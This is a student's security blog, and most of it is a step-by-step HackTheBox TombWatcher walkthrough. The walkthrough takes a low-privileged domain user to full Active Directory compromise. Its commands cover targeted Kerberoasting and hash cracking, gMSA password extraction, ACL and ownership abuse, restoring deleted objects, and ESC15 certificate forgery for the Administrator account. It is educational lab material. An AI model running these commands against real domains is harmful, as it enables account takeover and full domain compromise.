I am a cybersecurity student dedicating my time to mastering hands-on security operations, network penetration testing, and vulnerability research.
This platform is where I drop deep-dive technical walkthroughs, notes from complex lab networks, and research into real-world threat vectors. Dive into my recent writeups below to see how I think, troubleshoot, and exploit.
summary: Offensive Security portfolio featuring deep-dive machine writeups, Web App penetration testing, and Active Directory exploitation notes.
title: Home

content:
Summary # TombWatcher is a medium-difficulty Active Directory machine that focuses heavily on privilege escalation through delegated permissions and object control abuse. Starting from a low-privileged domain user, the attack chain leverages WriteSPN permissions to perform targeted Kerberoasting and recover additional credentials. Subsequent access to privileged groups enables the extraction of a gMSA password, which is used to compromise multiple domain accounts through ACL abuse. After obtaining interactive access via WinRM, further enumeration reveals control over an organizational unit and the ability to restore deleted Active Directory objects. The machine concludes with the exploitation of a vulnerable AD CS certificate template through ESC15, allowing the issuance of a certificate for the Administrator account and resulting in full domain compromise.
Reconnaissance # Rustscan # We start with rustscan to quickly identify all the open ports from the total 65535 possible ports
└─$ rustscan -a <TARGET_IP> -r 0-65535 PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 80/tcp open http syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49693/tcp open unknown syn-ack ttl 127 49694/tcp open unknown syn-ack ttl 127 49696/tcp open unknown syn-ack ttl 127 49716/tcp open unknown syn-ack ttl 127 51436/tcp open unknown syn-ack ttl 127 51453/tcp open unknown syn-ack ttl 127 Nmap # After identifying the open ports using Rustscan, we will perform detailed enumeration of each open port using Nmap:
└─$ nmap <TARGET_IP> -T4 -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49693,49694,49696,49716,51436,51453 Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-24 23:41 +0500 Nmap scan report for <TARGET_IP> Host is up (0.41s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-06-24 18:41:29Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name) |_ssl-date: 2026-06-24T18:43:05+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=DC01.tombwatcher.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb | Not valid before: 2026-06-24T11:54:55 |_Not valid after: 2027-06-24T11:54:55 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name) |_ssl-date: 2026-06-24T18:43:04+00:00; -1s from scanner time. | ssl-cert: Subject: commonName=DC01.tombwatcher.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb | Not valid before: 2026-06-24T11:54:55 |_Not valid after: 2027-06-24T11:54:55 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.tombwatcher.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb | Not valid before: 2026-06-24T11:54:55 |_Not valid after: 2027-06-24T11:54:55 |_ssl-date: 2026-06-24T18:43:05+00:00; 0s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name) |_ssl-date: 2026-06-24T18:43:04+00:00; -1s from scanner time. | ssl-cert: Subject: commonName=DC01.tombwatcher.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb | Not valid before: 2026-06-24T11:54:55 |_Not valid after: 2027-06-24T11:54:55 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open msrpc Microsoft Windows RPC 49693/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49694/tcp open msrpc Microsoft Windows RPC 49696/tcp open msrpc Microsoft Windows RPC 49716/tcp open msrpc Microsoft Windows RPC 51436/tcp open msrpc Microsoft Windows RPC 51453/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required | smb2-time: | date: 2026-06-24T18:42:25 |_ start_date: N/A From the output, we identified that the DNS name of the machine is “DC01.tombwatcher.htb” and the Active Directory Domain is “tombwatcher.htb”. We can write the following DNS entry in our /etc/hosts file:
<TARGET_IP> DC01.tombwatcher.htb DC01 tombwatcher.htb To sync the system time with that of the DC, use ntpdate:
└─$ sudo ntpdate <TARGET_IP> Initial Access # Active Directory Enumeration # We will start with enumerating the SMB shares accessible to us using the netexec tool:
└─$ sudo nxc smb <TARGET_IP> -u henry -p 'H3nry_987TGV!' --shares Share Permissions Remark ----- ----------- ------ ADMIN$ Remote Admin C$ Default share IPC$ READ Remote IPC NETLOGON READ Logon server share SYSVOL READ Logon server share These are standard Domain Controller SMB shares and there are no custom share available. We can spider the shares automatically and see if we have any interesting files hidden:
└─$ sudo nxc smb <TARGET_IP> -u henry -p 'H3nry_987TGV!' -M spider_plus Reviewing the output did not reveal anything useful. Therefore, we will use the BloodHound Python collector to gather Active Directory data and identify potential attack paths:
└─$ bloodhound-ce-python -c all -u 'henry' -p 'H3nry_987TGV!' -d 'tombwatcher.htb' -ns <TARGET_IP> --dns-tcp --zip --dns-timeout 90 Open the Bloodhound GUI with:
└─$ bloodhound-start Starting from the Henry user node, since we have valid credentials for this account. We analyzed that it has WriteSPN property over the user Alfred
As Kerberoasting attacks target Service Accounts set with ServicePrincipalNames to find their clear-text password by cracking the acquired TGS tickets, we can use this property to write or remove SPNs from the target user. Since this user currently has no SPNs configured, we can add one ourselves. We can use the suggested methods provided by bloodhound by clicking WriteSPN > Linux Abuse
The tool says that to perform the kerberoasting attack, we can use the python script targetedKerberoast.py as:
└─$ python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' --dc-ip <TARGET_IP> --request-user alfred Save the hash in a file and crack with hashcat mode 13100:
└─$ hashcat -m 13100 Alfred-TGS.hash /usr/share/wordlists/rockyou.txt The password for the Alfred account is successfully recovered.
Looking at the outbound object control privileges of Alfred we see that it can add itself to the AD group Infrastructure
Looking at the outbound object control of the group shows it can read the gMSA (Group Managed Service Account) password for the computer account Ansible_Dev$
Then looking at the privileges of the computer account revealed that it can change the account password for user Sam
Looking at Sam’s priviliges we can write the owner attribute of the user John
Then John has GenericAll over the Organizational Unit (OU) ADCS
The attack path can be summarized as:
Henry → Alfred → Infrastructure → Ansible_Dev$ → Sam → John → ADCS OU Exploiting the BloodHound Attack Path # We can start with adding Alfred to the Infrastructure group with bloodyad:
└─$ bloodyad -u alfred -p '<Alfred-Password>' -d tombwatcher.htb -i <TARGET_IP> add groupMember Infrastructure Alfred [+] Alfred added to Infrastructure To dump the gMSA password of Ansible_Dev$:
└─$ sudo netexec ldap <TARGET_IP> -u alfred -p '<Alfred-Password>' --gmsa We will get the NTLM hash in output. Using the hash, we can now change the password of user Sam:
└─$ bloodyad -u 'ansible_dev$' -p ':<NTHash>' -d tombwatcher.htb -i <TARGET_IP> set password sam 'Sam@12345' [+] Password changed successfully! To change the ownership of user John from existing owner to Sam:
└─$ bloodyad -u sam -p 'Sam@12345' -d tombwatcher.htb -i <TARGET_IP> set owner john sam [+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john NOTE: After some time the owner attribute of John is reset so make sure to rewrite the owner if further attacks don’t work
To confirm the ownership of the user, we can use impacket-owneredit:
└─$ impacket-owneredit tombwatcher.htb/sam:'Sam@12345' -dc-ip <TARGET_IP> -target john -action read Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Current owner information below [*] - SID: S-1-5-21-1392491010-1358638721-2126982587-1105 [*] - sAMAccountName: sam [*] - distinguishedName: CN=sam,CN=Users,DC=tombwatcher,DC=htb Now as we have the ownership, we can grant ourselves full control of the user by adding the GenericAll privileges:
└─$ bloodyad -u sam -p 'Sam@12345' -d tombwatcher.htb -i <TARGET_IP> add genericAll john sam [+] sam has now GenericAll on john Just like we changed the password of Sam, we can now use Sam to change the password of John:
└─$ bloodyad -u sam -p 'Sam@12345' -d tombwatcher.htb -i <TARGET_IP> set password john 'John@12345' [+] Password changed successfully! Checking the group membership of “Remote Management Users” in bloodhound, we only find John as a member of the Remote Management Users group, which grants him WinRM access to the host.
To login to WinRM:
└─$ evil-winrm -i <TARGET_IP> -u 'john' -p 'John@12345' We can find the user.txt in Desktop folder of user John:
*Evil-WinRM* PS C:\Users\john\Documents> cat ..\Desktop\user.txt Escalating Privileges # After gaining access as John, we have GenericAll rights over the OU ADCS. Checking the objects that come under this OU, we found only one GPO (Group Policy Object). Having the GenericAll rights, we can apply ACEs (Access Control Entries) that will be inherited down to the objects in the OU. All object will inherit the ACEs except those marked with ACL Inheritance Disabled as true. Checking the info of the GPO revealed that it’s not going to inherit the ACEs we apply to the OU
So we have to find some other way to reach the Administrator account.
Abusing the Deleted Objects Container # Rechecking the write privileges of our user john with bloodyad as bloodhound doesn’t show all the Active Directory configurations:
└─$ bloodyad -u john -p 'John@12345' -d tombwatcher.htb -i <TARGET_IP> get writable --right WRITE --otype ou distinguishedName: CN=Deleted Objects,DC=tombwatcher,DC=htb permission: WRITE distinguishedName: OU=ADCS,DC=tombwatcher,DC=htb permission: WRITE From here, we saw an OU “Deleted Objects” which acts like a Recycle Bin for Active Directory. It contains objects that are deleted from the Active Directory. As we have permissions over the OU, we can list the objects and find interesting ones that may help us in privilege escalation.
└─$ bloodyad -u john -p 'John@12345' -d tombwatcher.htb -i <TARGET_IP> get children --target 'CN=Deleted Objects,DC=tombwatcher,DC=htb' distinguishedName: CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb distinguishedName: CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb distinguishedName: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb The output shows 3 objects that seemed to be related to Active Directory Certificate Services. We can recover the user but first we need to have its SID which we can find with:
└─$ bloodyad -u john -d tombwatcher.htb -p 'John@12345' -i <TARGET_IP> get search -c 1.2.840.113556.1.4.2064 --resolve-sd --attr distinguishedName,sAMAccountName,objectSid,objectClass --base 'CN=Deleted Objects,DC=tombwatcher,DC=htb' --filter "(objectClass=user)" distinguishedName: CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb objectClass: top; person; organizationalPerson; user objectSid: S-1-5-21-1392491010-1358638721-2126982587-1109 sAMAccountName: cert_admin distinguishedName: CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb objectClass: top; person; organizationalPerson; user objectSid: S-1-5-21-1392491010-1358638721-2126982587-1110 sAMAccountName: cert_admin distinguishedName: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb objectClass: top; person; organizationalPerson; user objectSid: S-1-5-21-1392491010-1358638721-2126982587-1111 sAMAccountName: cert_admin Now to recover the deleted user object:
└─$ bloodyad -u john -p 'John@12345' -d tombwatcher.htb -i <TARGET_IP> set restore S-1-5-21-1392491010-1358638721-2126982587-1111 [+] S-1-5-21-1392491010-1358638721-2126982587-1111 has been restored successfully under CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb NOTE: Just like the owner attribute of John, the restored user is automatically deleted again after some time. So same advice for it like above.
From the output, the object is restored under OU ADCS. If we apply the ACE to the OU, it will also be applied to the cert_admin user:
└─$ impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'John@12345' Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU [*] DACL backed up to dacledit-20260625-040644.bak [*] DACL modified successfully! Gaining GenericAll privileges over every object of the OU, we can now reset the password of cert_admin:
└─$ bloodyad -u john -p 'John@12345' -d tombwatcher.htb -i <TARGET_IP> set password cert_admin "CertAdmin@12345" [+] Password changed successfully! Exploiting Active Directory Certificate Services # Given the name of the account, it is reasonable to investigate Active Directory Certificate Services (AD CS). We can check for vulnerabilities in the Certificate Authority and Templates using certipy:
└─$ certipy find -u 'cert_admin@tombwatcher.htb' -p 'CertAdmin@12345' -dc-ip <TARGET_IP> -vulnerable -stdout Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 33 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 11 enabled certificate templates [*] Finding issuance policies [*] Found 13 issuance policies [*] Found 0 OIDs linked to templates [*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP [!] Failed to connect to remote registry. Service should be starting now. Trying again... [*] Successfully retrieved CA configuration for 'tombwatcher-CA-1' [*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb' [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [*] Enumeration output: Certificate Authorities 0 CA Name : tombwatcher-CA-1 DNS Name : DC01.tombwatcher.htb Certificate Subject : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb Certificate Serial Number : 3428A7FC52C310B2460F8440AA8327AC Certificate Validity Start : 2024-11-16 00:47:48+00:00 Certificate Validity End : 2123-11-16 00:57:48+00:00 Web Enrollment HTTP Enabled : False HTTPS Enabled : False User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Active Policy : CertificateAuthority_MicrosoftDefault.Policy Permissions Owner : TOMBWATCHER.HTB\Administrators Access Rights ManageCa : TOMBWATCHER.HTB\Administrators TOMBWATCHER.HTB\Domain Admins TOMBWATCHER.HTB\Enterprise Admins ManageCertificates : TOMBWATCHER.HTB\Administrators TOMBWATCHER.HTB\Domain Admins TOMBWATCHER.HTB\Enterprise Admins Enroll : TOMBWATCHER.HTB\Authenticated Users Certificate Templates 0 Template Name : WebServer Display Name : Web Server Certificate Authorities : tombwatcher-CA-1 Enabled : True Client Authentication : False Enrollment Agent : False Any Purpose : False Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject Extended Key Usage : Server Authentication Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Schema Version : 1 Validity Period : 2 years Renewal Period : 6 weeks Minimum RSA Key Length : 2048 Template Created : 2024-11-16T00:57:49+00:00 Template Last Modified : 2024-11-16T17:07:26+00:00 Permissions Enrollment Permissions Enrollment Rights : TOMBWATCHER.HTB\Domain Admins TOMBWATCHER.HTB\Enterprise Admins TOMBWATCHER.HTB\cert_admin Object Control Permissions Owner : TOMBWATCHER.HTB\Enterprise Admins Full Control Principals : TOMBWATCHER.HTB\Domain Admins TOMBWATCHER.HTB\Enterprise Admins Write Owner Principals : TOMBWATCHER.HTB\Domain Admins TOMBWATCHER.HTB\Enterprise Admins Write Dacl Principals : TOMBWATCHER.HTB\Domain Admins TOMBWATCHER.HTB\Enterprise Admins Write Property Enroll : TOMBWATCHER.HTB\Domain Admins TOMBWATCHER.HTB\Enterprise Admins TOMBWATCHER.HTB\cert_admin [+] User Enrollable Principals : TOMBWATCHER.HTB\cert_admin [!] Vulnerabilities ESC15 : Enrollee supplies subject and schema version is 1. [*] Remarks ESC15 : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details. The Remarks at the end tells that it is vulnerable to ESC15 but exploitation depends upon whether the mentioned patch is applied or not.
Searching for techniques related to ESC15, we found the documentation created by the developer of the certipy tool Oliver Lyak. ESC15 is defined as:
ESC15 (also tracked as CVE-2024-49019 or referred to as EKUwu) is an Active Directory Certificate Services (AD CS) privilege escalation vulnerability. It exploits a logic flaw in Schema Version 1 templates. It allows attackers to inject unauthorized Extended Key Usages (EKUs) during certificate enrollment to authenticate as highly privileged accounts (e.g., Domain Admins).
Since cert_admin has enrollment rights on the vulnerable WebServer template, we can request a certificate containing arbitrary application policies. By injecting the Client Authentication EKU and requesting a certificate for the Administrator account, we can obtain credentials that allow authentication as Domain Administrator.
└─$ certipy req -ca tombwatcher-CA-1 -template WebServer -upn Administrator@tombwatcher.htb -sid S-1-5-21-1392491010-1358638721-2126982587-500 -application-policies 'Client Authentication' -u 'cert_admin@tombwatcher.htb' -p 'CertAdmin@12345' -dc-ip <TARGET_IP> Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Request ID is 6 [*] Successfully requested certificate [*] Got certificate with UPN 'Administrator@tombwatcher.htb' [*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500' [*] Saving certificate and private key to 'administrator.pfx' [*] Wrote certificate and private key to 'administrator.pfx' Now the 2nd step is to authenticate via Schannel:
└─$ certipy auth -pfx administrator.pfx -domain tombwatcher.htb -dc-ip <TARGET_IP> -ldap-shell Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] SAN UPN: 'Administrator@tombwatcher.htb' [*] SAN URL SID: 'S-1-5-21-1392491010-1358638721-2126982587-500' [*] Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500' [*] Connecting to 'ldaps://<TARGET_IP>:636' [*] Authenticated to '<TARGET_IP>' as: 'u:TOMBWATCHER\\Administrator' Type help for list of commands # As we are authenticated as Domain Admin, we have all the privileges that the help menu of the tool shows. We can add our user John to the Administrators group of Domain Controller with:
# add_user_to_group john "Administrators" Adding user: john to group Administrators result: OK Now authenticating via WinRM:
└─$ evil-winrm -i 10.129.232.167 -u 'john' -p 'John@12345' *Evil-WinRM* PS C:\Users\john\Documents> whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ========================================== ================ ============ =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\Administrators Alias S-1-5-32-544 Mandatory group, Enabled by default, <SNIP> Access to the root.txt is allowed now
*Evil-WinRM* PS C:\Users\john\Documents> cat C:\Users\Administrator\Desktop\root.txt
summary: Explore WriteSPN abuse, gMSA password extraction, Deleted Objects recovery, and ESC15 AD CS privilege escalation on HTB TombWatcher.
title: TombWatcher Machine Writeup | HTB

content:
The main motivation behind building this website was originally just to create a personal portfolio to showcase my work. But as I spent more time working through labs and documenting my findings, I realized that keeping all of this to myself felt a bit selfish. Cybersecurity has a notoriously steep learning curve, and if my notes, writeups, or the pitfalls I’ve stepped into can save someone else a few hours of frustration, then this space becomes worth much more than just a resume placeholder.
One thing that became clear to me after diving into this field is that cybersecurity is essentially a never-ending black hole. You can spend hours, days, or even weeks studying a specific concept, only to turn a corner and discover an entirely new set of techniques, tools, and methodologies you’ve never encountered before. It can feel intimidating at times, but I’ve learned that nobody starts out as a technical expert who knows everything. The people who seem steps ahead are often just those who have spent more time experimenting, researching, and learning from their mistakes. I document my journey here because it helps me keep track of that constant growth and ensures I continue moving forward rather than standing still.
Through all the hours spent troubleshooting, researching, and breaking things in controlled environments, I’ve come to the conclusion that success in this field boils down to two things: proper research and raw, hands-on practice.
It is incredibly easy to get trapped in “tutorial hell”,reading endless theory books, watching courses, and memorizing definitions. But the truth is that you can absorb theoretical concepts all day long, yet until you actually get your hands dirty, you will never fully understand how systems work, how they fail, or how they can be secured. Real understanding comes from building, breaking, fixing, and repeating that process over and over again.
Many people don’t realize that the answers aren’t hidden away in some secret archive; they are buried in documentation, public GitHub repositories, blog posts, and open-source projects, waiting for someone persistent enough to go looking. This website is my attempt to bridge that information gap. It serves as a collection of the challenges I’ve faced, the machines I’ve solved, and the practical notes I’ve taken throughout my learning journey. If something here helps you solve a problem faster, understand a concept more clearly, or avoid a mistake I once made, then sharing it was worth it.
summary: Cybersecurity student specializing in offensive security, active directory exploitation, and web application penetration testing.
